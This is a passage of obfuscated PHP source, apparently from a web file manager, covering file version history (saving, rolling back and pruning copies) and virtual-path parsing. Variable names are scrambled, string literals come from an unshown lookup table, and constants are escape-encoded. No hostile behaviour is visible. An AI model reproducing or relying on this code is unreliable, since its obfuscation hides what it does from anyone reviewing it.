$ŒÌËƒŸ” == $—ñ¼ùŠç[1337] ? min(5, $å¤÷Àö‹) : $å¤÷Àö‹; if ($å¤÷Àö‹ <= 0) { return; } $×Áêã¸° = IO::info($ñ®¥òİ); $ËÂããŞƒ = $Âø©ŠÍ[$—ñ¼ùŠç[447]]; if ($×Áêã¸°[$—ñ¼ùŠç[79]] == 0) { return; } if ($×Áêã¸°[$—ñ¼ùŠç[79]] >= 1024 * 1024 * 500) { return !1; } $¯íÇõÛğ = IO::hashSimple($ñ®¥òİ); if ($ËÂããŞƒ && $ËÂããŞƒ[0][$—ñ¼ùŠç[688]] == $¯íÇõÛğ) { return !0; } if (array_key_exists($—ñ¼ùŠç[236], $×Áêã¸°) && !$×Áêã¸°[$—ñ¼ùŠç[236]]) { return !1; } $é…Şû«è = short_id(time()); $öÉªŞœ‡ = array($—ñ¼ùŠç[477] => $é…Şû«è, $—ñ¼ùŠç[688] => $¯íÇõÛğ, $—ñ¼ùŠç[32] => $×Áêã¸°[$—ñ¼ùŠç[32]] . $—ñ¼ùŠç[10] . date($—ñ¼ùŠç[1338]) . rand_string(1), $—ñ¼ùŠç[79] => $×Áêã¸°[$—ñ¼ùŠç[79]], $—ñ¼ùŠç[538] => USER_ID, $—ñ¼ùŠç[234] => time(), $—ñ¼ùŠç[1339] => $—ñ¼ùŠç[12]); IO::mkdir($Âø©ŠÍ[$—ñ¼ùŠç[1340]]); $Æ–¬Ó‹› = IO::copy($ñ®¥òİ, $Âø©ŠÍ[$—ñ¼ùŠç[1340]], !1, $öÉªŞœ‡[$—ñ¼ùŠç[32]]); if (!$Æ–¬Ó‹›) { self::clearEmptyFolder($Âø©ŠÍ[$—ñ¼ùŠç[1340]]); return !1; } array_unshift($ËÂããŞƒ, $öÉªŞœ‡); if (count($ËÂããŞƒ) > $ÃŸ‡ß) { $Ñ“°ÃËÂ = array_slice($ËÂããŞƒ, $ÃŸ‡ß); foreach ($Ñ“°ÃËÂ as $™µ˜¾­) { IO::remove($Âø©ŠÍ[$—ñ¼ùŠç[1340]] . $™µ˜¾­[$—ñ¼ùŠç[32]]); } $ËÂããŞƒ = array_slice($ËÂããŞƒ, 0, $ÃŸ‡ß); } return self::saveData($Âø©ŠÍ[$—ñ¼ùŠç[1341]], $ËÂããŞƒ); } public static function remove($©°ªØèú, $œÃ–„ğŸ) { $ÚÔºè¥˜ =& $_SERVER[®»±”ó²]; $±äÙæóê = self::listData($©°ªØèú); $éšøá¼¼ = array(); if (!$±äÙæóê) { return !1; } foreach ($±äÙæóê[$ÚÔºè¥˜[447]] as $×¯óêÜ) { if ($×¯óêÜ[$ÚÔºè¥˜[477]] == $œÃ–„ğŸ) { IO::remove($±äÙæóê[$ÚÔºè¥˜[1340]] . $×¯óêÜ[$ÚÔºè¥˜[32]]); continue; } $éšøá¼¼[] = $×¯óêÜ; } return self::saveData($±äÙæóê[$ÚÔºè¥˜[1341]], $éšøá¼¼); } public static function clear($†’™´‘¦, $Á³µèªı = true) { $¿„İİÖ =& $_SERVER[®»±”ó²]; $Úé¸óÒ = self::listData($†’™´‘¦, $Á³µèªı); if (!$Úé¸óÒ) { return !1; } foreach ($Úé¸óÒ[$¿„İİÖ[447]] as $û†”¸È) { IO::remove($Úé¸óÒ[$¿„İİÖ[1340]] . $û†”¸È[$¿„İİÖ[32]]); } return self::saveData($Úé¸óÒ[$¿„İİÖ[1341]], array()); } public static function moveHistory($ÕÙ«²ˆÛ, $“Å£½©Ø = '', $Œ­²Úš = '') { $«“ˆï¸æ =& $_SERVER[®»±”ó²]; $¤¬ìÅ = self::listData($ÕÙ«²ˆÛ, !1); if (!$¤¬ìÅ || !$¤¬ìÅ[$«“ˆï¸æ[447]]) { return !1; } $¨‚áÎ·² = $«“ˆï¸æ[1328]; $“Å£½©Ø = $“Å£½©Ø ? $“Å£½©Ø : get_path_this($ÕÙ«²ˆÛ); $Œ­²Úš = $Œ­²Úš ? $Œ­²Úš : $¤¬ìÅ[$«“ˆï¸æ[1340]]; $‰äíã“ğ = substr(get_path_this($¤¬ìÅ[$«“ˆï¸æ[1341]]), 0, -strlen($¨‚áÎ·²)); foreach ($¤¬ìÅ[$«“ˆï¸æ[447]] as $ï®İ—ùù => $ú»•ğÛô) { $øÒäÅïô = $“Å£½©Ø . substr($ú»•ğÛô[$«“ˆï¸æ[32]], strlen($‰äíã“ğ)); $öìÕ¨× = IO::move($¤¬ìÅ[$«“ˆï¸æ[1340]] . $ú»•ğÛô[$«“ˆï¸æ[32]], $Œ­²Úš, !1, $øÒäÅïô); if ($öìÕ¨×) { $¤¬ìÅ[$«“ˆï¸æ[447]][$ï®İ—ùù][$«“ˆï¸æ[32]] = $øÒäÅïô; } } $¤¬ìÅ[$«“ˆï¸æ[1341]] = IO::move($¤¬ìÅ[$«“ˆï¸æ[1341]], $Œ­²Úš, !1, $“Å£½©Ø . $¨‚áÎ·²); self::saveData($¤¬ìÅ[$«“ˆï¸æ[1341]], $¤¬ìÅ[$«“ˆï¸æ[447]]); self::clearEmptyFolder($¤¬ìÅ[$«“ˆï¸æ[1340]]); } public static function rollback($¿åÅ…í…, $±íÔı¶‹) { $ÑÑ§±Ò =& $_SERVER[®»±”ó²]; $”à‰ïíà = self::listData($¿åÅ…í…); if (!$”à‰ïíà) { return; } $ã—Û“©š = IO::info($¿åÅ…í…); foreach ($”à‰ïíà[$ÑÑ§±Ò[447]] as $ê©¢Å‡ => $äË¢îƒ­) { if ($äË¢îƒ­[$ÑÑ§±Ò[477]] == $±íÔı¶‹) { self::add($¿åÅ…í…); $†©ü¾ëç = $”à‰ïíà[$ÑÑ§±Ò[1340]] . $äË¢îƒ­[$ÑÑ§±Ò[32]]; $Ä§´÷ñ = IO::copy($†©ü¾ëç, IO::pathFather($¿åÅ…í…), REPEAT_REPLACE, $ã—Û“©š[$ÑÑ§±Ò[32]]); if ($Ä§´÷ñ) { self::remove($¿åÅ…í…, $±íÔı¶‹); } return $Ä§´÷ñ; } } return !1; } public static function setDetail($¾‹Á²Ëû, $Ğ…ı¬İŒ, $æ©½ò¦) { $êÕÌ”± =& $_SERVER[®»±”ó²]; $ç©ëú = self::listData($¾‹Á²Ëû); if (!$ç©ëú) { return; } foreach ($ç©ëú[$êÕÌ”±[447]] as $‰°æÁßú => $ÏÚå“Ùƒ) { if ($ÏÚå“Ùƒ[$êÕÌ”±[477]] == $Ğ…ı¬İŒ) { $ç©ëú[$êÕÌ”±[447]][$‰°æÁßú][$êÕÌ”±[1339]] = $æ©½ò¦; self::saveData($ç©ëú[$êÕÌ”±[1341]], $ç©ëú[$êÕÌ”±[447]]); return !0; } } return !1; } public static function fileInfo($³º°ƒ»Æ, $¿à©ÚÜÑ) { $¥°”¯ÙÃ =& $_SERVER[®»±”ó²]; $â³ İ¿Õ = self::listData($³º°ƒ»Æ); if (!$â³ İ¿Õ) { show_json(LNG($¥°”¯ÙÃ[108]), !1); } $¡Ôİàêã = $¥°”¯ÙÃ[12]; foreach ($â³ İ¿Õ[$¥°”¯ÙÃ[447]] as $âéğğœ‚ => $†¥áÊÙù) { if ($†¥áÊÙù[$¥°”¯ÙÃ[477]] != $¿à©ÚÜÑ) { continue; } $¡Ôİàêã = $â³ İ¿Õ[$¥°”¯ÙÃ[1340]] . $†¥áÊÙù[$¥°”¯ÙÃ[32]]; break; } if (!$¡Ôİàêã) { show_json(LNG($¥°”¯ÙÃ[108]), !1); } return IO::info($¡Ôİàêã); } public static function fileOut($ì®¯è¡®, $ÜïĞš¦ô, $¢œñƒôÌ = false) { $¶‡Áø´ =& $_SERVER[®»±”ó²]; $ş„©¸§” = self::fileInfo($ì®¯è¡®, $ÜïĞš¦ô); $ŞãïêÃÀ =& $GLOBALS[$¶‡Áø´[7]]; $¢œñƒôÌ = isset($ŞãïêÃÀ[$¶‡Áø´[1291]]) && $ŞãïêÃÀ[$¶‡Áø´[1291]] == 1; if (isset($ŞãïêÃÀ[$¶‡Áø´[33]]) && $ŞãïêÃÀ[$¶‡Áø´[33]] == $¶‡Áø´[1342]) { return IO::fileOutImage($ş„©¸§”[$¶‡Áø´[87]], $ŞãïêÃÀ[$¶‡Áø´[1343]]); } IO::fileOut($ş„©¸§”[$¶‡Áø´[87]], $¢œñƒôÌ, get_path_this($ì®¯è¡®)); } public static function listData($¾†£ÑÏ‹, $˜îÖ·Ï = true) { $Ò¢†öâ =& $_SERVER[®»±”ó²]; if ($˜îÖ·Ï && !IO::exist($¾†£ÑÏ‹)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¾†£ÑÏ‹, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $àãñÉã× = self::pathHistory($¾†£ÑÏ‹); $Î€€òãˆ = array($Ò¢†öâ[1341] => $àãñÉã× . $Ò¢†öâ[1328], $Ò¢†öâ[1340] => rtrim(get_path_father($àãñÉã×), $Ò¢†öâ[8]) . $Ò¢†öâ[8], $Ò¢†öâ[447] => array()); $ßÕ§—Ä„ = IO::getContent($Î€€òãˆ[$Ò¢†öâ[1341]]); if ($ßÕ§—Ä„) { $í½Œ©‚í = json_decode($ßÕ§—Ä„, !0); if (is_array($í½Œ©‚í)) { $Î€€òãˆ[$Ò¢†öâ[447]] = $í½Œ©‚í; } } return $Î€€òãˆ; } private static function saveData($ªÃ¹×È, $ìÍ¥†ö†) { $ıêË…‡‹ =& $_SERVER[®»±”ó²]; self::log($ıêË…‡‹[1344] . $ªÃ¹×È . $ıêË…‡‹[74] . count($ìÍ¥†ö†), $ıêË…‡‹[832]); if ($ìÍ¥†ö†) { return IO::setContent($ªÃ¹×È, json_encode($ìÍ¥†ö†)); } $§åëİÄ¸ = IO::pathFather($ªÃ¹×È); IO::remove($ªÃ¹×È); self::clearEmptyFolder($§åëİÄ¸); return !0; } public static function clearEmptyFolder($…Åê÷øÑ) { $ÅãØô® =& $_SERVER[®»±”ó²]; if (trim($…Åê÷øÑ, $ÅãØô®[8]) == trim(self::$_historyBase, $ÅãØô®[8])) { return; } $Ù£”á‰¢ = IO::pathFather($…Åê÷øÑ); $Ü§Ò„©Ó = IO::has($…Åê÷øÑ, !0); if ($Ü§Ò„©Ó[$ÅãØô®[242]] > 0 || $Ü§Ò„©Ó[$ÅãØô®[243]] > 0) { return; } IO::remove($…Åê÷øÑ); self::clearEmptyFolder($Ù£”á‰¢); } private static function getBasePath() { $©×Öá =& $_SERVER[®»±”ó²]; $¨¶¼™Ş• = Model($©×Öá[1345])->get($©×Öá[1346]); if ($¨¶¼™Ş•) { if (!IO::exist($¨¶¼™Ş•)) { IO::mkdir($¨¶¼™Ş•); } if (get_path_this($¨¶¼™Ş•) == $©×Öá[1331]) { $ú‡›Æã¬ = $©×Öá[1347] . rand_string(8); @rename($¨¶¼™Ş•, get_path_father($¨¶¼™Ş•) . $©×Öá[8] . $ú‡›Æã¬); $¨¶¼™Ş• = DATA_PATH . $ú‡›Æã¬ . $©×Öá[8]; file_put_contents(DATA_PATH . $©×Öá[1278], $©×Öá[12]); Model($©×Öá[1345])->set($©×Öá[1346], $¨¶¼™Ş•); } return $¨¶¼™Ş•; } $¨¶¼™Ş• = DATA_PATH . $©×Öá[1347] . rand_string(8) . $©×Öá[8]; $¨¶¼™Ş• = IO::mkdir($¨¶¼™Ş•); $¨¶¼™Ş• = rtrim($¨¶¼™Ş•, $©×Öá[8]) . $©×Öá[8]; file_put_contents($¨¶¼™Ş• . $©×Öá[1278], $©×Öá[12]); file_put_contents(DATA_PATH . $©×Öá[1278], $©×Öá[12]); Model($©×Öá[1345])->set($©×Öá[1346], $¨¶¼™Ş•); return $¨¶¼™Ş•; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\x72\122\x65\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\163\145\162\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\x65\x72\106\151\x6c\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\x46\x69\x6c\x65\x54\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\x52\x6f\x6f\164\x53\145\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\x72\123\x68\141\162\145\114\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\145\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\145\111\164\x65\x6d\114\x69\156\153\175"; const KOD_SEARCH = "\173\x73\x65\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\143\x6b\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\162\x52\145\x6e\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\x72\151\x76\145\162\175"; public static function typeList() { $Ë«€—‹Ş =& $_SERVER[®»±”ó²]; return array($Ë«€—‹Ş[1348] => self::KOD_SOURCE, $Ë«€—‹Ş[1349] => self::KOD_USER_RECYCLE, $Ë«€—‹Ş[1350] => self::KOD_USER_FAV, $Ë«€—‹Ş[1351] => self::KOD_USER_FILE_TAG, $Ë«€—‹Ş[1352] => self::KOD_USER_FILE_TYPE, $Ë«€—‹Ş[1353] => self::KOD_GROUP_ROOT_SELF, $Ë«€—‹Ş[1354] => self::KOD_USER_SHARE, $Ë«€—‹Ş[1355] => self::KOD_USER_SHARE_LINK, $Ë«€—‹Ş[1356] => self::KOD_USER_SHARE_TO_ME, $Ë«€—‹Ş[1357] => self::KOD_SHARE_ITEM, $Ë«€—‹Ş[1358] => self::KOD_SHARE_LINK, $Ë«€—‹Ş[1359] => self::KOD_SEARCH, $Ë«€—‹Ş[1360] => self::KOD_BLOCK, $Ë«€—‹Ş[1361] => self::KOD_IO, $Ë«€—‹Ş[1362] => self::KOD_USER_RECENT, $Ë«€—‹Ş[1363] => self::KOD_USER_DRIVER); } public static function parse($˜²ŒÛô) { $ùÜ·ş«Í =& $_SERVER[®»±”ó²]; $˜²ŒÛô = self::clear($˜²ŒÛô); $Á¬ÌÁ¢Û = array_values(self::typeList()); preg_match($ùÜ·ş«Í[1364], $˜²ŒÛô, $ÒŒ‹şùš); $úù©ğ§ = array($ùÜ·ş«Í[507] => !1, $ùÜ·ş«Í[1365] => !1, $ùÜ·ş«Í[504] => !1, $ùÜ·ş«Í[87] => $˜²ŒÛô, $ùÜ·ş«Í[1262] => !1, $ùÜ·ş«Í[1261] => $ùÜ·ş«Í[12]); if (is_array($ÒŒ‹şùš) && count($ÒŒ‹şùš) == 5) { $Øú„¢ = $ùÜ·ş«Í[1366] . $ÒŒ‹şùš[2] . $ùÜ·ş«Í[404]; if (in_array($Øú„¢, $Á¬ÌÁ¢Û)) { $úù©ğ§[$ùÜ·ş«Í[1262]] = $ÒŒ‹şùš[1]; $úù©ğ§[$ùÜ·ş«Í[33]] = $Øú„¢; $úù©ğ§[$ùÜ·ş«Í[1367]] = substr($Øú„¢, 1, -1); $úù©ğ§[$ùÜ·ş«Í[477]] = $ÒŒ‹şùš[3]; } $úù©ğ§[$ùÜ·ş«Í[1261]] = $ÒŒ‹şùš[4]; } if ($úù©ğ§[$ùÜ·ş«Í[507]] == self::KOD_SOURCE) { $úù©ğ§[$ùÜ·ş«Í[1265]] = $úù©ğ§[$ùÜ·ş«Í[477]]; } $â¾¥¶— = array($ùÜ·ş«Í[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $úù©ğ§[$ùÜ·ş«Í[1330]] = in_array($úù©ğ§[$ùÜ·ş«Í[33]], $â¾¥¶—); return $úù©ğ§; } public static function isTruePath($²–«˜Ş˜) { $çïÍ¤µ¡ =& $_SERVER[®»±”ó²]; if (substr($²–«˜Ş˜, 0, 1) != $çïÍ¤µ¡[1366]) { return !0; } if (strpos($²–«˜Ş˜, $çïÍ¤µ¡[494]) === 0) { return !0; } if (strpos($²–«˜Ş˜, $çïÍ¤µ¡[1334]) === 0) { return !0; } if (strpos($²–«˜Ş˜, $çïÍ¤µ¡[1368]) === 0) { return !0; } if (strpos($²–«˜Ş˜, $çïÍ¤µ¡[1369]) === 0) { return !0; } if (strpos($²–«˜Ş˜, $çïÍ¤µ¡[1370]) === 0) { return !0; } return !1; } public static function clear($Ü¨ïœÇó) { $Ò„Ñş¶¯ =& $_SERVER[®»±”ó²]; $Ü¨ïœÇó = str_replace(array($Ò„Ñş¶¯[1166], $Ò„Ñş¶¯[288]), $Ò„Ñş¶¯[53], $Ü¨ïœÇó); $Ü¨ïœÇó = str_replace($Ò„Ñş¶¯[100], $Ò„Ñş¶¯[8], $Ü¨ïœÇó); $±£•‹™Ê = $Ò„Ñş¶¯[1371]; if (substr($Ü¨ïœÇó, 0, 3) == $Ò„Ñş¶¯[1372]) { $Ü¨ïœÇó = substr($Ü¨ïœÇó, 3); } while (strstr($Ü¨ïœÇó, $±£•‹™Ê)) { $Ü¨ïœÇó = str_replace($±£•‹™Ê, $Ò„Ñş¶¯[8], $Ü¨ïœÇó); } $Ü¨ïœÇó = preg_replace($Ò„Ñş¶¯[1373], $Ò„Ñş¶¯[8], $Ü¨ïœÇó); if ($Ü¨ïœÇó == $Ò„Ñş¶¯[8]) { return $Ò„Ñş¶¯[8]; } $Ü¨ïœÇó = rtrim($Ü¨ïœÇó, $Ò„Ñş¶¯[8]); return $Ü¨ïœÇó; } public static function pathTrue($¥Èñâ®¢) { $øôàÌ½ƒ =& $_SERVER[®»±”ó²]; if (!$¥Èñâ®¢) { return $øôàÌ½ƒ[12]; } $¥Èñâ®¢ = str_replace($øôàÌ½ƒ[257], $øôàÌ½ƒ[8], str_replace($øôàÌ½ƒ[1374], $øôàÌ½ƒ[8], $¥Èñâ®¢)); $¥Èñâ®¢ = str_replace($øôàÌ½ƒ[257], $øôàÌ½ƒ[8], str_replace($øôàÌ½ƒ[1374], $øôàÌ½ƒ[8], $¥Èñâ®¢)); if (!strstr($¥Èñâ®¢, $øôàÌ½ƒ[1372])) { return $¥Èñâ®¢; } $ÊøŸ—»• = explode($øôàÌ½ƒ[8], $¥Èñâ®¢); foreach ($ÊøŸ—»• as $¢ñ‰™Çú => $ò‡êÛ‰¼) { if ($ò‡êÛ‰¼ !== $øôàÌ½ƒ[1375]) { continue; } for ($ª“íÉ = $¢ñ‰™Çú; $ª“íÉ >= 0; $ª“íÉ--) { if ($ÊøŸ—»•[$ª“íÉ] === $øôàÌ½ƒ[10] || $ÊøŸ—»•[$ª“íÉ] === $øôàÌ½ƒ[1375] || $ÊøŸ—»•[$ª“íÉ] === -1) { continue; } if ($ÊøŸ—»•[$ª“íÉ] === $øôàÌ½ƒ[12]) { $ÊøŸ—»•[$¢ñ‰™Çú] = -1; break; } $ÊøŸ—»•[$¢ñ‰™Çú] = -1; $ÊøŸ—»•[$ª“íÉ] = -1; break; } } $Â”üèé = array(); foreach ($ÊøŸ—»• as $ò‡êÛ‰¼) { if ($ò‡êÛ‰¼ !== -1) { $Â”üèé[] = $ò‡êÛ‰¼; } } $¤´õç³ = implode($øôàÌ½ƒ[8], $Â”üèé); if (strpos($¤´õç³, $øôàÌ½ƒ[1376]) === 0) { $¤´õç³ = $øôàÌ½ƒ[1372] . substr($¤´õç³, strlen($øôàÌ½ƒ[1376])); } return $¤´õç³; } public static function pathUrlClear($‚·¬¹ñ…) { $ÌÅšÑáß =& $_SERVER[®»±”ó²]; if (!$‚·¬¹ñ…) { return $‚·¬¹ñ…; } $‚·¬¹ñ… = rawurldecode($‚·¬¹ñ…); $‚·¬¹ñ… = str_replace($ÌÅšÑáß[1374], $ÌÅšÑáß[8], $‚·¬¹ñ…); if (strpos($‚·¬¹ñ…, $ÌÅšÑáß[76]) > 0) { $‚·¬¹ñ… = substr($‚·¬¹ñ…, 0, strpos($‚·¬¹ñ…, $ÌÅšÑáß[76])); } if (strpos($‚·¬¹ñ…, $ÌÅšÑáß[1377]) > 0) { $‚·¬¹ñ… = substr($‚·¬¹ñ…, 0, strpos($‚·¬¹ñ…, $ÌÅšÑáß[1377])); } return $‚·¬¹ñ…; } public static function sourceID($Ã°™Ò„†) { $ÄÜÃ”ØÔ =& $_SERVER[®»±”ó²]; $ÊàëÅÃõ = self::parse($Ã°™Ò„†); if ($ÊàëÅÃõ[$ÄÜÃ”ØÔ[33]] !== self::KOD_SOURCE) { show_json(LNG($ÄÜÃ”ØÔ[1378]), !1); } return $ÊàëÅÃõ[$ÄÜÃ”ØÔ[477]]; } public static function make($´·¦‚×ï) { if (!$´·¦‚×ï) { return !1; } return self::makePath(self::KOD_SOURCE, intval($´·¦‚×ï)); } public static function makeShare($æîêªêË, $Éö¥ª×) { return self::makePath(self::KOD_SHARE_ITEM, $æîêªêË, $Éö¥ª×); } public static function makeFileTypePath($Ä¨ÃØ£È) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ä¨ÃØ£È); } public static function makeFileTagPath($¡ÏÌñå) { return self::makePath(self::KOD_USER_FILE_TAG, $¡ÏÌñå); } public static function makePath($Ç„´äº, $Ú£í¡¹Ü = '', $˜şÈÈö® = '') { $’Ÿ°»œ” =& $_SERVER[®»±”ó²]; $ØĞùéƒ = substr($Ç„´äº, 1, -1); $ñ¾²±êÁ = $’Ÿ°»œ”[1379] . $ØĞùéƒ . $’Ÿ°»œ”[1380] . $Ú£í¡¹Ü . $’Ÿ°»œ”[1381]; $ñ¾²±êÁ = $˜şÈÈö® ? $ñ¾²±êÁ . $˜şÈÈö® . $’Ÿ°»œ”[8] : $ñ¾²±êÁ; return $ñ¾²±êÁ; } public static function hashPath($Ïî³ÂàÕ, $ÚÇ©Ä = false) { $£Ÿ¤Ââ— =& $_SERVER[®»±”ó²]; if (!$Ïî³ÂàÕ) { return $£Ÿ¤Ââ—[12]; } $€Õ»şÎ– = is_array($Ïî³ÂàÕ) ? $Ïî³ÂàÕ : IO::info($Ïî³ÂàÕ); $ø÷µ“Œ× = _get($€Õ»şÎ–, $£Ÿ¤Ââ—[1382], $£Ÿ¤Ââ—[12]); if (!$ø÷µ“Œ× && isset($€Õ»şÎ–[$£Ÿ¤Ââ—[238]])) { $ø÷µ“Œ× = trim($€Õ»şÎ–[$£Ÿ¤Ââ—[238]], $£Ÿ¤Ââ—[121]); } if ($ø÷µ“Œ×) { return $ø÷µ“Œ×; } if (!$ø÷µ“Œ× && isset($€Õ»şÎ–[$£Ÿ¤Ââ—[194]]) && $€Õ»şÎ–[$£Ÿ¤Ââ—[194]]) { $€Õ»şÎ– = IO::info(KodIO::make($€Õ»şÎ–[$£Ÿ¤Ââ—[194]])); $ø÷µ“Œ× = _get($€Õ»şÎ–, $£Ÿ¤Ââ—[1382], $£Ÿ¤Ââ—[12]); } $Ì™äë«‘ = md5($€Õ»şÎ–[$£Ÿ¤Ââ—[87]] . $€Õ»şÎ–[$£Ÿ¤Ââ—[79]] . $€Õ»şÎ–[$£Ÿ¤Ââ—[88]]); $”şÒä†å = $Ì™äë«‘ . $£Ÿ¤Ââ—[1383]; $ø÷µ“Œ× = $ø÷µ“Œ× ? $ø÷µ“Œ× : Cache::get($”şÒä†å); if (!$ø÷µ“Œ× && $ÚÇ©Ä) { $ø÷µ“Œ× = IO::hashSimple($€Õ»şÎ–[$£Ÿ¤Ââ—[87]]); Cache::set($”şÒä†å, $ø÷µ“Œ× ? $ø÷µ“Œ× : $Ì™äë«‘, 3600 * 24 * 30); } return $ø÷µ“Œ× ? $ø÷µ“Œ× : $Ì™äë«‘; } public static function hashPathSafe($ßÜ·Ìİø, $º•âÊËÒ = false) { $¨Ü¬å‘ =& $_SERVER[®»±”ó²]; $¡“¨¬ø = self::hashPath($ßÜ·Ìİø, $º•âÊËÒ); return md5($¡“¨¬ø . $¨Ü¬å‘[1384] . Model($¨Ü¬å‘[851])->get($¨Ü¬å‘[852])); } public static function initSystemPath() { $íÍÁ©Òå =& $_SERVER[®»±”ó²]; if (defined($íÍÁ©Òå[1385])) { return; } define($íÍÁ©Òå[1385], self::systemPath($íÍÁ©Òå[192])); define($íÍÁ©Òå[1386], self::systemPath($íÍÁ©Òå[1387])); define($íÍÁ©Òå[1388], self::systemPath($íÍÁ©Òå[1389])); define($íÍÁ©Òå[1390], self::systemPath($íÍÁ©Òå[1391])); IOHistory::bindEvent(); } public static function systemPath($‚¤ çÇ¦) { $ÁÀØ°“È =& $_SERVER[®»±”ó²]; $Ä·¨ú = $ÁÀØ°“È[1392] . ucfirst($‚¤ çÇ¦); $ ¿À É = Model($ÁÀØ°“È[851])->get($Ä·¨ú); if ($ ¿À É) { return $ ¿À É; } if ($‚¤ çÇ¦ == $ÁÀØ°“È[192]) { $ ¿À É = self::make(Model($ÁÀØ°“È[911])->systemRootPathAdd($ÁÀØ°“È[621])); } else { $ ¿À É = self::systemPath($ÁÀØ°“È[192]); $¢Á”§á = self::sourceID($ ¿À É); $ ¿À É = self::make(Model($ÁÀØ°“È[911])->mkdir($¢Á”§á, $‚¤ çÇ¦)); } Model($ÁÀØ°“È[851])->set($Ä·¨ú, $ ¿À É); return $ ¿À É; } public static function systemFolder($š¶„Ê×š) { $¬ÀÃµ¦è = IO_PATH_SYSTEM_SOURCE . $š¶„Ê×š; $êà¶ï¤ = Cache::get($¬ÀÃµ¦è); if (!$êà¶ï¤) { $’¥ñØäş = IO::infoFullSimple($¬ÀÃµ¦è); if (!$’¥ñØäş) { $êà¶ï¤ = IO::mkdir($¬ÀÃµ¦è, REPEAT_SKIP); } else { $êà¶ï¤ = $’¥ñØäş[$_SERVER[®»±”ó²][87]]; } Cache::set($¬ÀÃµ¦è, $êà¶ï¤, 3600 * 10); } return $êà¶ï¤; } public static function defaultDriver() { return Model($_SERVER[®»±”ó²][848])->defaultDriver(); } public static function defaultDriverInit() { $Ş«×û‘ =& $_SERVER[®»±”ó²]; static $ƒ£íŠÊ’ = false; if ($ƒ£íŠÊ’) { return $ƒ£íŠÊ’; } $âªøËñ’ = self::defaultDriver(); $ƒ£íŠÊ’ = IO::init($Ş«×û‘[1393] . $âªøËñ’[$Ş«×û‘[477]] . $Ş«×û‘[1381]); return $ƒ£íŠÊ’; } public static function fileTypeList() { $Á¿äç¬‘ =& $_SERVER[®»±”ó²]; $×Â¸ˆ› = $GLOBALS[$Á¿äç¬‘[6]][$Á¿äç¬‘[1394]]; foreach ($×Â¸ˆ› as $ä¾·ØŠ¢ => $ÄÆñÔ’À) { $ÈÌáßÍˆ = $Á¿äç¬‘[1395] . $ä¾·ØŠ¢; $ú²…«Áİ = LNG($ÈÌáßÍˆ); if ($ÈÌáßÍˆ != $ú²…«Áİ) { $×Â¸ˆ›[$ä¾·ØŠ¢][$Á¿äç¬‘[32]] = $ú²…«Áİ; } } return $×Â¸ˆ›; } public static function ioFileDriverGet($ü¹Ÿö = '') { $ÓíıíÕê =& $_SERVER[®»±”ó²]; static $Á…şúÂ× = array(); static $™Á‘Ñ¸Õ = array(); static $Ì»™À´ê = array(); static $¸¾Êã˜ò = false; if ($¸¾Êã˜ò === !1) { $¸¾Êã˜ò = array($ÓíıíÕê[591] => array(), $ÓíıíÕê[678] => array()); $š¼‹…æë = Model($ÓíıíÕê[1396])->get(!1, $ÓíıíÕê[1397]); foreach ($š¼‹…æë as $ÎÕ‘· => $ô¼ùşÃ‡) { if (!$ô¼ùşÃ‡ || $ô¼ùşÃ‡ == $ÓíıíÕê[12]) { continue; } if (strstr($ÎÕ‘·, $ÓíıíÕê[1398])) { $¯œ’§íÕ = str_replace($ÓíıíÕê[1398], $ÓíıíÕê[12], $ÎÕ‘·); $¸¾Êã˜ò[$ÓíıíÕê[591]][$¯œ’§íÕ] = $ô¼ùşÃ‡; } else { if (strstr($ÎÕ‘·, $ÓíıíÕê[1399])) { $¯œ’§íÕ = str_replace($ÓíıíÕê[1399], $ÓíıíÕê[12], $ÎÕ‘·); $¸¾Êã˜ò[$ÓíıíÕê[678]][$¯œ’§íÕ] = $ô¼ùşÃ‡; } } } } $»ä’ËÁª = self::defaultDriver(); if (!$ü¹Ÿö || !$¸¾Êã˜ò[$ÓíıíÕê[591]] && !$¸¾Êã˜ò[$ÓíıíÕê[678]]) { return $»ä’ËÁª; } $ÛÊÚÙã½ = self::getPathSourceID($ü¹Ÿö); if (!$ÛÊÚÙã½) { return $»ä’ËÁª; } if (isset($Á…şúÂ×[$ÛÊÚÙã½])) { return $Á…şúÂ×[$ÛÊÚÙã½]; } $Ú¯÷í = Model($ÓíıíÕê[911])->sourceInfo($ÛÊÚÙã½); $±à°”ØĞ = $Ú¯÷í[$ÓíıíÕê[582]]; $ç¸ñÛßè = array(); if (!$Ú¯÷í) { return $»ä’ËÁª; } if ($Ú¯÷í[$ÓíıíÕê[191]] == $ÓíıíÕê[91]) { if (isset($Ì»™À´ê[$±à°”ØĞ])) { return $Ì»™À´ê[$±à°”ØĞ]; } if (isset($¸¾Êã˜ò[$ÓíıíÕê[678]][$±à°”ØĞ])) { $Âü‚·êÃ = Model($ÓíıíÕê[848])->driverInfo($¸¾Êã˜ò[$ÓíıíÕê[678]][$±à°”ØĞ]); $»ä’ËÁª = $Âü‚·êÃ ? $Âü‚·êÃ : $»ä’ËÁª; $Ì»™À´ê[$±à°”ØĞ] = $»ä’ËÁª; $Á…şúÂ×[$ÛÊÚÙã½] = $»ä’ËÁª; return $»ä’ËÁª; } $ç¸ñÛßè = self::groupParentUser($±à°”ØĞ); } else { if 